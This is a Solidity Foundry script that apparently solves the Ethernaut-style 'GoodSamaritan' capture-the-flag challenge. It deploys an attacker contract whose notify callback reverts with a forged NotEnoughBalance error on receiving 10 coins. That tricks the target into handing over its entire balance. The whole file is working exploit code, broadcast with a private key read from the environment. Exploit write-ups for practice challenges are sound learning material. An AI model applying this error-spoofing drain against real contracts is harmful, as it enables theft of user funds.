// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GoodSamaritan.sol";  // Import the challenge contract
import "forge-std/Script.sol";  // Import Foundry's script utilities

contract GoodSamaritanExploit is Script {
    address public instanceAddress = 0x4E5179560A0A4E20d52bA0Ab369aE0302EF869c4;  // Replace with actual instance address

    // Declare the attacker contract instance
    ExploitAttacker public attackerContract;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));  // Start broadcasting transactions

        // Step 1: Deploy the attacker contract, passing the GoodSamaritan instance address
        attackerContract = new ExploitAttacker(instanceAddress);

        // Step 2: Execute the attack by requesting a donation
        attackerContract.askForDonation();

        vm.stopBroadcast();  // Stop broadcasting transactions
    }
}

// Attacker contract implementing the required notify function for the exploit
contract ExploitAttacker {
    GoodSamaritan public target;  // Store the GoodSamaritan instance

    // Custom error to match the challenge logic
    error NotEnoughBalance();

    // Constructor to initialize with the target GoodSamaritan instance address
    constructor(address _target) {
        target = GoodSamaritan(_target);
    }

    // Function to trigger the donation request
    function askForDonation() public {
        target.requestDonation();
    }

    // Custom notify function to revert with NotEnoughBalance error when receiving 10 coins
    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();  // Trigger the revert and exploit the logic
        }
    }
}